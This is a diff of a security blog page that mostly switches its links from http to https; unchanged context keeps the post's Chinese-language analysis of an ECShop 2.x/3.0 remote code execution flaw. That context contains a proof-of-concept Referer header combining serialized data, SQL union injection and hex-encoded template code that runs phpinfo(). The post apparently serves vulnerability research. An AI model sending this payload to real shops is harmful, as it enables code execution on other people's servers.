@@ -67,21 +67,21 @@
 
 
 
-<link href="http://static-passer6y.d0g3.cn/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="https://static-passer6y.d0g3.cn/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="http://static-passer6y.d0g3.cn/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="http://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0">
+<link href="https://static-passer6y.d0g3.cn/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="http://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="http://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0">
 
 
-  <link rel="mask-icon" href="http://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0" color="#222">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0">
+
+
+  <link rel="mask-icon" href="https://static-passer6y.d0g3.cn/images/favicon1.ico?v=6.3.0" color="#222">
 
 
 
@@ -127,16 +127,16 @@
 <meta name="keywords" content="Crypto">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ECShop 2.x 3.0代码执行漏洞分析">
-<meta property="og:url" content="http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/index.html">
+<meta property="og:url" content="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/index.html">
 <meta property="og:site_name" content="Passer6y&#39;s Blog">
 <meta property="og:description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
-<meta property="og:updated_time" content="2020-03-19T11:16:35.017Z">
+<meta property="og:image" content="https://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
+<meta property="og:updated_time" content="2020-03-19T12:47:56.509Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECShop 2.x 3.0代码执行漏洞分析">
 <meta name="twitter:description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
-<meta name="twitter:image" content="http://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
+<meta name="twitter:image" content="https://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
 
 
 
@@ -145,7 +145,7 @@
 
 
 
-  <link rel="canonical" href="http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/"/>
+  <link rel="canonical" href="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/"/>
 
 
 
@@ -399,12 +399,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/">
+    <link itemprop="mainEntityOfPage" href="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Passer6y">
       <meta itemprop="description" content="A salty fish">
-      <meta itemprop="image" content="http://static-passer6y.d0g3.cn/images/21.jpg">
+      <meta itemprop="image" content="https://static-passer6y.d0g3.cn/images/21.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -458,7 +458,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2020-03-19 19:16:35" itemprop="dateModified" datetime="2020-03-19T19:16:35+08:00">2020-03-19</time>
+                <time title="Modified: 2020-03-19 20:47:56" itemprop="dateModified" datetime="2020-03-19T20:47:56+08:00">2020-03-19</time>
               
             
           </span>
@@ -503,7 +503,7 @@
       
         <p>之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下<br><a id="more"></a></p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前渗透时遇到了这样一个站，当时看到这个命令执行的过程有点东西，于是抽了个时间复现一下</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="http://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="http://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="https://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="https://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p>
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>ECshop3.0<br>php 5.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg" alt="-w1613"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>user.php 305行渲染的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//310行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果没有user.php， 则$back_act为referer</span></span><br><span class="line">    $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 330行</span></span><br><span class="line">$smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);     <span class="comment">// 渲染referer到模板</span></span><br><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure></p>
@@ -537,7 +537,7 @@
     <strong>Post author:  </strong>Passer6y</li>
   <li class="post-copyright-link">
     <strong>Post link: </strong>
-    <a href="http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/" title="ECShop 2.x 3.0代码执行漏洞分析">http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/</a>
+    <a href="https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/" title="ECShop 2.x 3.0代码执行漏洞分析">https://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/</a>
   </li>
   <li class="post-copyright-license">
     <strong>Copyright Notice:  </strong>本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/3.0/deed.zh">CC BY-NC-SA 3.0</a>许可协议。转载请注明出处！</li>
@@ -642,7 +642,7 @@
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image"
-                src="http://static-passer6y.d0g3.cn/images/21.jpg"
+                src="https://static-passer6y.d0g3.cn/images/21.jpg"
                 alt="Passer6y" />
             
               <p class="site-author-name" itemprop="name">Passer6y</p>
@@ -737,7 +737,7 @@
             <div class="links-of-author motion-element">
               
                 <span class="links-of-author-item">
-                  <a href="http://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                   
                 </span>
               
@@ -762,39 +762,39 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
+                    <a href="https://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://Hu3sky.github.io" title="Hu3sky" target="_blank">Hu3sky</a>
+                    <a href="https://Hu3sky.github.io" title="Hu3sky" target="_blank">Hu3sky</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
+                    <a href="https://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
+                    <a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
+                    <a href="https://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://ph0rse.me/" title="Ph0rse" target="_blank">Ph0rse</a>
+                    <a href="https://ph0rse.me/" title="Ph0rse" target="_blank">Ph0rse</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
+                    <a href="https://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="http://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
+                    <a href="https://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
                   </li>
                 
               </ul>
@@ -933,17 +933,17 @@
 
   
   
-    <script type="text/javascript" src="http://static-passer6y.d0g3.cn/lib/jquery/index.js?v=2.1.3"></script>
+    <script type="text/javascript" src="https://static-passer6y.d0g3.cn/lib/jquery/index.js?v=2.1.3"></script>
   
 
   
   
-    <script type="text/javascript" src="http://static-passer6y.d0g3.cn/lib/velocity/velocity.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="https://static-passer6y.d0g3.cn/lib/velocity/velocity.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="http://static-passer6y.d0g3.cn/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="https://static-passer6y.d0g3.cn/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
   
 
   
@@ -955,32 +955,32 @@
   
 
 
-  <script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/utils.js?v=6.3.0"></script>
+  <script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/utils.js?v=6.3.0"></script>
 
-  <script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/motion.js?v=6.3.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/affix.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/schemes/pisces.js?v=6.3.0"></script>
+  <script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/motion.js?v=6.3.0"></script>
 
 
 
   
-  <script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/scrollspy.js?v=6.3.0"></script>
-<script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/post-details.js?v=6.3.0"></script>
+  
+
+
+  <script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/post-details.js?v=6.3.0"></script>
 
 
 
   
 
 
-  <script type="text/javascript" src="http://static-passer6y.d0g3.cn/js/src/bootstrap.js?v=6.3.0"></script>
+  <script type="text/javascript" src="https://static-passer6y.d0g3.cn/js/src/bootstrap.js?v=6.3.0"></script>
 
 
 
